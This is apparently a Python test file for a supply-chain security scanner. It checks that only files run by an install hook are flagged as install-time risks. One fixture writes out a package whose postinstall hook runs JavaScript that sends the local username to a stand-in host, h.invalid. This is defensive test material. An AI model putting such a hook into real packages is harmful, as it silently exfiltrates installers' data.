"""The install_time risk factor applies only to a file an install hook reaches (item 51; the ONE RULE
of notes 36 and 37). A user's v0.6.0 report: `scan corpus/malicious/ci-secret-exfil -v` scored a
release workflow "+15 executes during install or build", and the same for AGENTS.md and .cursorrules,
none of which an install runs."""

from __future__ import annotations

import json
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from support import ROOT


class InstallTimeKit:
    @staticmethod
    def factors(target: Path) -> dict[str, set[str]]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        out: dict[str, set[str]] = {}
        for f in result.findings:
            if f.rule_id.startswith("OPERATIONAL."):
                continue
            name = f.location.path.rsplit("/", 1)[-1]
            out.setdefault(name, set()).update(factor.name for factor in f.risk.factors)
        return out


class TestOnlyWhatAnInstallRunsIsInstallTime:
    def test_a_workflow_is_not_install_time(self) -> None:
        factors = InstallTimeKit.factors(ROOT / "corpus" / "malicious" / "ci-secret-exfil")
        assert factors, "the fixture must still raise its finding"
        assert not any("install_time" in names for names in factors.values()), factors

    def test_an_agent_file_is_not_install_time(self) -> None:
        factors = InstallTimeKit.factors(ROOT / "corpus" / "malicious" / "agent-rules-injection")
        agent = {k: v for k, v in factors.items() if k in ("AGENTS.md", ".cursorrules")}
        assert agent, factors
        assert not any("install_time" in names for names in agent.values()), agent

    def test_an_unreached_file_is_not_and_a_hook_run_one_is(self, tmp_path) -> None:
        manifest = {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}}
        (tmp_path / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
        body = (
            "const os = require('os');\nconst https = require('https');\n"
            "https.request({ host: 'h.invalid', path: '/?u=' + os.userInfo().username }).end();\n"
        )
        (tmp_path / "setup.js").write_text(body, encoding="utf-8")
        (tmp_path / "lib").mkdir()
        (tmp_path / "lib" / "spare.js").write_text(body, encoding="utf-8")
        factors = InstallTimeKit.factors(tmp_path)
        assert "install_time" in factors.get("setup.js", set()), factors
        assert "install_time" not in factors.get("spare.js", set()), factors
